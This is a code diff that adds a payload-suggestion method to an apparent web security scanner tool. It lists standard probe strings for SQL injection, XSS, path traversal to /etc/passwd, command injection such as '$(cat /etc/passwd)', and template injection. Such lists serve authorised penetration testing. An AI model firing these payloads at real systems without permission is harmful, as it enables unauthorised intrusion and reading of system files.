@@ -132,6 +132,47 @@ else:
                 
         return "1. Analyze request.\n2. Replay with payload.\n3. Verify impact.\n4. Report finding."
 
+    @staticmethod
+    def get_suggested_payloads(vuln_type):
+        """Returns a list of payloads to try manually."""
+        payloads = {
+            'SQL': [
+                "' OR 1=1 --",
+                "' OR '1'='1",
+                "admin' --",
+                "' UNION SELECT 1, version(), user() --",
+                "1' ORDER BY 10 --"
+            ],
+            'XSS': [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert(1)>",
+                "\"><script>alert(1)</script>",
+                "javascript:alert(1)"
+            ],
+            'LFI': [
+                "../../../../etc/passwd",
+                "....//....//....//etc/passwd",
+                "php://filter/convert.base64-encode/resource=index.php"
+            ],
+            'Command': [
+                "; id",
+                "| whoami",
+                "$(cat /etc/passwd)",
+                "& ping -c 1 127.0.0.1"
+            ],
+            'SSTI': [
+                "{{7*7}}",
+                "${7*7}",
+                "<%= 7*7 %>"
+            ]
+        }
+        
+        for key, p_list in payloads.items():
+            if key.lower() in vuln_type.lower():
+                return "\n".join([f"- {p}" for p in p_list])
+        
+        return "- (No specific payloads available for this type)"
+
 class SecurityScannerGUI:
     def __init__(self, root):
         self.root = root
